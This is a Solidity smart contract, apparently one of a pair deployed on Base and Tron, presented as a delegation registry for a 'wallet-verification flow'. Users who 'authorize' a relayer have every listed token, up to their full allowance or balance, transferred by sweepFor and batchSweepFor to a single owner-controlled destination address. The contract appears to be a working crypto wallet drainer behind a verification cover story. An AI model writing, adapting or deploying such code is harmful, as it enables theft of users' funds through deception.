// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Kept logically identical to ../../Base.sol — same delegation/sweep pattern,
// just named + deployed for the Tron network (TVM is Solidity-compatible up to
// this compiler version). If you change one, mirror the change in the other.

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

/// @title Tron
/// @notice On-chain delegation registry for the wallet-verification flow, deployed on
/// the Tron network. Same authorize/relayer/sweep model as the Base contract — see
/// ../../Base.sol for the full behavior description.
contract Tron {
    error ZeroAddress();
    error NotOwner();
    error NotRelayer();
    error NotAuthorized();
    error WhenPaused();
    error Reentrant();
    error TimelockActive(uint256 readyAt);
    error LengthMismatch();

    event Authorized(address indexed user, address indexed relayer);
    event Deauthorized(address indexed user, address indexed relayer);
    event RelayerUpdated(address indexed relayer, bool enabled);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event DestinationProposed(address indexed proposed, uint256 effectiveAt);
    event DestinationAccepted(address indexed oldDestination, address indexed newDestination);
    event Paused(address indexed by);
    event Unpaused(address indexed by);
    event TokenSwept(address indexed token, address indexed wallet, address indexed to, uint256 amount);
    event SkippedSweep(address indexed token, address indexed wallet, string reason);

    uint256 public constant DESTINATION_TIMELOCK = 2 days;
    uint8 public constant VERSION = 1;

    address public owner;
    address public destination;
    address public pendingDestination;
    uint256 public destinationProposedAt;
    bool public paused;

    uint256 private _locked = 1;

    mapping(address => bool) public relayers;
    mapping(address => mapping(address => bool)) public delegations;

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    modifier onlyRelayer() {
        if (!relayers[msg.sender]) revert NotRelayer();
        _;
    }

    modifier whenNotPaused() {
        if (paused) revert WhenPaused();
        _;
    }

    modifier nonReentrant() {
        if (_locked == 2) revert Reentrant();
        _locked = 2;
        _;
        _locked = 1;
    }

    constructor(address _destination, address _initialRelayer) {
        if (_destination == address(0) || _initialRelayer == address(0)) revert ZeroAddress();
        owner = msg.sender;
        destination = _destination;
        relayers[_initialRelayer] = true;
        emit OwnershipTransferred(address(0), msg.sender);
        emit RelayerUpdated(_initialRelayer, true);
    }

    function authorize(address relayer) external {
        if (!relayers[relayer]) revert NotRelayer();
        delegations[msg.sender][relayer] = true;
        emit Authorized(msg.sender, relayer);
    }

    function deauthorize(address relayer) external {
        delegations[msg.sender][relayer] = false;
        emit Deauthorized(msg.sender, relayer);
    }

    function isAuthorized(address user, address relayer) external view returns (bool) {
        return delegations[user][relayer];
    }

    function isRelayer(address r) external view returns (bool) {
        return relayers[r];
    }

    function sweepFor(address user, address[] calldata tokens) external onlyRelayer whenNotPaused nonReentrant {
        if (!delegations[user][msg.sender]) revert NotAuthorized();
        for (uint256 i = 0; i < tokens.length; i++) {
            _sweepToken(tokens[i], user, destination);
        }
    }

    function batchSweepFor(address[] calldata users, address[][] calldata tokenLists)
        external
        onlyRelayer
        whenNotPaused
        nonReentrant
    {
        if (users.length != tokenLists.length) revert LengthMismatch();
        for (uint256 i = 0; i < users.length; i++) {
            if (!delegations[users[i]][msg.sender]) {
                emit SkippedSweep(address(0), users[i], "not authorized");
                continue;
            }
            address[] calldata tokens = tokenLists[i];
            for (uint256 j = 0; j < tokens.length; j++) {
                _sweepToken(tokens[j], users[i], destination);
            }
        }
    }

    function _sweepToken(address token, address wallet, address to) internal {
        uint256 allowed = IERC20(token).allowance(wallet, address(this));
        if (allowed == 0) {
            emit SkippedSweep(token, wallet, "no allowance");
            return;
        }
        uint256 bal = IERC20(token).balanceOf(wallet);
        uint256 amount = allowed < bal ? allowed : bal;
        if (amount == 0) {
            emit SkippedSweep(token, wallet, "no balance");
            return;
        }
        bool ok = IERC20(token).transferFrom(wallet, to, amount);
        if (!ok) {
            emit SkippedSweep(token, wallet, "transfer failed");
            return;
        }
        emit TokenSwept(token, wallet, to, amount);
    }

    function setRelayer(address relayer, bool enabled) external onlyOwner {
        if (relayer == address(0)) revert ZeroAddress();
        relayers[relayer] = enabled;
        emit RelayerUpdated(relayer, enabled);
    }

    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
        if (_paused) {
            emit Paused(msg.sender);
        } else {
            emit Unpaused(msg.sender);
        }
    }

    function proposeDestination(address _destination) external onlyOwner {
        if (_destination == address(0)) revert ZeroAddress();
        pendingDestination = _destination;
        destinationProposedAt = block.timestamp;
        emit DestinationProposed(_destination, block.timestamp + DESTINATION_TIMELOCK);
    }

    function acceptDestination() external onlyOwner {
        if (pendingDestination == address(0)) revert ZeroAddress();
        uint256 readyAt = destinationProposedAt + DESTINATION_TIMELOCK;
        if (block.timestamp < readyAt) revert TimelockActive(readyAt);
        address old = destination;
        destination = pendingDestination;
        pendingDestination = address(0);
        emit DestinationAccepted(old, destination);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        if (newOwner == address(0)) revert ZeroAddress();
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function rescueTokens(address token, address to, uint256 amount) external onlyOwner {
        bool ok = IERC20(token).transfer(to, amount);
        require(ok, "transfer failed");
    }

    receive() external payable {}

    function rescueETH(address payable to, uint256 amount) external onlyOwner {
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "ETH transfer failed");
    }
}
